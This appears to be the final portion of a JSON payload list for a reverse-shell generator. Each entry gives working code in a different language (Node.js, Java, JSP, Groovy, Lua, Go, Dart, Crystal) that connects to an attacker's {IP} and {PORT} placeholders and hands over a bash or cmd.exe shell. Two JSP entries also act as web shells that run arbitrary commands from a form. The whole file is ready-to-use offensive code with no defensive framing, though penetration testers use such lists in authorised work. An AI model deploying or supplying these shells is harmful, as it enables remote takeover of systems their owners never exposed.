      "command": "(function(){\n    var net = require(\"net\"),\n        cp = require(\"child_process\"),\n        sh = cp.spawn(\"bash\", []);\n    var client = new net.Socket();\n    client.connect({PORT}, \"{IP}\", function(){\n        client.pipe(sh.stdin);\n        sh.stdout.pipe(client);\n        sh.stderr.pipe(client);\n    });\n    return /a/; // Prevents the Node.js application from crashing\n})();\n"
    },
    {
      "name": "Java #3",
      "command": "import java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.Socket;\n\npublic class shell {\n    public static void main(String[] args) {\n        String host = \"{IP}\";\n        int port = {PORT};\n        String cmd = \"bash\";\n        try {\n            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();\n            Socket s = new Socket(host, port);\n            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();\n            OutputStream po = p.getOutputStream(), so = s.getOutputStream();\n            while (!s.isClosed()) {\n                while (pi.available() > 0)\n                    so.write(pi.read());\n                while (pe.available() > 0)\n                    so.write(pe.read());\n                while (si.available() > 0)\n                    po.write(si.read());\n                so.flush();\n                po.flush();\n                Thread.sleep(50);\n                try {\n                    p.exitValue();\n                    break;\n                } catch (Exception e) {}\n            }\n            p.destroy();\n            s.close();\n        } catch (Exception e) {}\n    }\n}\n"
    },
    {
      "name": "Java Web",
      "command": "<%@\npage import=\"java.lang.*, java.util.*, java.io.*, java.net.*\"\n% >\n<%!\nstatic class StreamConnector extends Thread\n{\n        InputStream is;\n        OutputStream os;\n        StreamConnector(InputStream is, OutputStream os)\n        {\n                this.is = is;\n                this.os = os;\n        }\n        public void run()\n        {\n                BufferedReader isr = null;\n                BufferedWriter osw = null;\n                try\n                {\n                        isr = new BufferedReader(new InputStreamReader(is));\n                        osw = new BufferedWriter(new OutputStreamWriter(os));\n                        char buffer[] = new char[8192];\n                        int lenRead;\n                        while( (lenRead = isr.read(buffer, 0, buffer.length)) > 0)\n                        {\n                                osw.write(buffer, 0, lenRead);\n                                osw.flush();\n                        }\n                }\n                catch (Exception ioe)\n                try\n                {\n                        if(isr != null) isr.close();\n                        if(osw != null) osw.close();\n                }\n                catch (Exception ioe)\n        }\n}\n%>\n\n<h1>JSP Backdoor Reverse Shell</h1>\n\n<form method=\"post\">\nIP Address\n<input type=\"text\" name=\"ipaddress\" size=30>\nPort\n<input type=\"text\" name=\"port\" size=10>\n<input type=\"submit\" name=\"Connect\" value=\"Connect\">\n</form>\n<p>\n<hr>\n\n<%\nString ipAddress = request.getParameter(\"ipaddress\");\nString ipPort = request.getParameter(\"port\");\nif(ipAddress != null && ipPort != null)\n{\n        Socket sock = null;\n        try\n        {\n                sock = new Socket(ipAddress, (new Integer(ipPort)).intValue());\n                Runtime rt = Runtime.getRuntime();\n                Process proc = rt.exec(\"cmd.exe\");\n                StreamConnector outputConnector =\n                        new StreamConnector(proc.getInputStream(),\n                                          sock.getOutputStream());\n                StreamConnector inputConnector =\n                        new StreamConnector(sock.getInputStream(),\n                                          proc.getOutputStream());\n                outputConnector.start();\n                inputConnector.start();\n        }\n        catch(Exception e) \n}\n%>\n"
    },
    {
      "name": "Java Two Way",
      "command": "<%\n    /*\n     * Usage: This is a 2 way shell, one web shell and a reverse shell. First, it will try to connect to a listener (atacker machine), with the IP and Port specified at the end of the file.\n     * If it cannot connect, an HTML will prompt and you can input commands (sh/cmd) there and it will prompts the output in the HTML.\n     * Note that this last functionality is slow, so the first one (reverse shell) is recommended. Each time the button \"send\" is clicked, it will try to connect to the reverse shell again (apart from executing \n     * the command specified in the HTML form). This is to avoid to keep it simple.\n     */\n%>\n\n<%@page import=\"java.lang.*\"%>\n<%@page import=\"java.io.*\"%>\n<%@page import=\"java.net.*\"%>\n<%@page import=\"java.util.*\"%>\n\n<html>\n<head>\n    <title>jrshell</title>\n</head>\n<body>\n<form METHOD=\"POST\" NAME=\"myform\" ACTION=\"\">\n    <input TYPE=\"text\" NAME=\"shell\">\n    <input TYPE=\"submit\" VALUE=\"Send\">\n</form>\n<pre>\n<%\n    // Define the OS\n    String shellPath = null;\n    try\n    {\n        if (System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") == -1) {\n            shellPath = new String(\"/bin/sh\");\n        } else {\n            shellPath = new String(\"cmd.exe\");\n        }\n    } catch( Exception e ){}\n    // INNER HTML PART\n    if (request.getParameter(\"shell\") != null) {\n        out.println(\"Command: \" + request.getParameter(\"shell\") + \"\\n<BR>\");\n        Process p;\n        if (shellPath.equals(\"cmd.exe\"))\n            p = Runtime.getRuntime().exec(\"cmd.exe /c \" + request.getParameter(\"shell\"));\n        else\n            p = Runtime.getRuntime().exec(\"/bin/sh -c \" + request.getParameter(\"shell\"));\n        OutputStream os = p.getOutputStream();\n        InputStream in = p.getInputStream();\n        DataInputStream dis = new DataInputStream(in);\n        String disr = dis.readLine();\n        while ( disr != null ) {\n            out.println(disr);\n            disr = dis.readLine();\n        }\n    }\n    // TCP PORT PART\n    class StreamConnector extends Thread\n    {\n        InputStream wz;\n        OutputStream yr;\n        StreamConnector( InputStream wz, OutputStream yr ) {\n            this.wz = wz;\n            this.yr = yr;\n        }\n        public void run()\n        {\n            BufferedReader r  = null;\n            BufferedWriter w = null;\n            try\n            {\n                r  = new BufferedReader(new InputStreamReader(wz));\n                w = new BufferedWriter(new OutputStreamWriter(yr));\n                char buffer[] = new char[8192];\n                int length;\n                while( ( length = r.read( buffer, 0, buffer.length ) ) > 0 )\n                {\n                    w.write( buffer, 0, length );\n                    w.flush();\n                }\n            } catch( Exception e ){}\n            try\n            {\n                if( r != null )\n                    r.close();\n                if( w != null )\n                    w.close();\n            } catch( Exception e ){}\n        }\n    }\n \n    try {\n        Socket socket = new Socket( \"{IP}\", {PORT} ); // Replace with wanted ip and port\n        Process process = Runtime.getRuntime().exec( shellPath );\n        new StreamConnector(process.getInputStream(), socket.getOutputStream()).start();\n        new StreamConnector(socket.getInputStream(), process.getOutputStream()).start();\n        out.println(\"port opened on \" + socket);\n     } catch( Exception e ) {}\n%>\n</pre>\n</body>\n</html>\n"
    },
    {
      "name": "Javascript",
      "command": "String command = \"var host = '{IP}';\" +\n                       \"var port = {PORT};\" +\n                       \"var cmd = 'bash';\"+\n                       \"var s = new java.net.Socket(host, port);\" +\n                       \"var p = new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start();\"+\n                       \"var pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();\"+\n                       \"var po = p.getOutputStream(), so = s.getOutputStream();\"+\n                       \"print ('Connected');\"+\n                       \"while (!s.isClosed()) {\"+\n                       \"    while (pi.available() > 0)\"+\n                       \"        so.write(pi.read());\"+\n                       \"    while (pe.available() > 0)\"+\n                       \"        so.write(pe.read());\"+\n                       \"    while (si.available() > 0)\"+\n                       \"        po.write(si.read());\"+\n                       \"    so.flush();\"+\n                       \"    po.flush();\"+\n                       \"    java.lang.Thread.sleep(50);\"+\n                       \"    try {\"+\n                       \"        p.exitValue();\"+\n                       \"        break;\"+\n                       \"    }\"+\n                       \"    catch (e) {\"+\n                       \"    }\"+\n                       \"}\"+\n                       \"p.destroy();\"+\n                       \"s.close();\";\nString x = \"\\\"\\\".getClass().forName(\\\"javax.script.ScriptEngineManager\\\").newInstance().getEngineByName(\\\"JavaScript\\\").eval(\\\"\"+command+\"\\\")\";\nref.add(new StringRefAddr(\"x\", x);\n"
    },
    {
      "name": "Groovy",
      "command": "String host=\"{IP}\";int port={PORT};String cmd=\"bash\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();\n"
    },
    {
      "name": "Lua #2",
      "command": "lua5.1 -e 'local host, port = \"{IP}\", {PORT} local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'\n"
    },
    {
      "name": "Golang",
      "command": "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"{IP}:{PORT}\");cmd:=exec.Command(\"bash\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go\n"
    },
    {
      "name": "Dart",
      "command": "import 'dart:io';\nimport 'dart:convert';\n\nmain() {\n  Socket.connect(\"{IP}\", {PORT}).then((socket) {\n    socket.listen((data) {\n      Process.start('bash', []).then((Process process) {\n        process.stdin.writeln(new String.fromCharCodes(data).trim());\n        process.stdout\n          .transform(utf8.decoder)\n          .listen((output) { socket.write(output); });\n      });\n    },\n    onDone: () {\n      socket.destroy();\n    });\n  });\n}\n"
    },
    {
      "name": "Crystal (system)",
      "command": "crystal eval 'require \"process\";require \"socket\";c=Socket.tcp(Socket::Family::INET);c.connect(\"{IP}\",{PORT});loop{m,l=c.receive;p=Process.new(m.rstrip(\"\\n\"),output:Process::Redirect::Pipe,shell:true);c<<p.output.gets_to_end}'\n"
    }
  ]
}
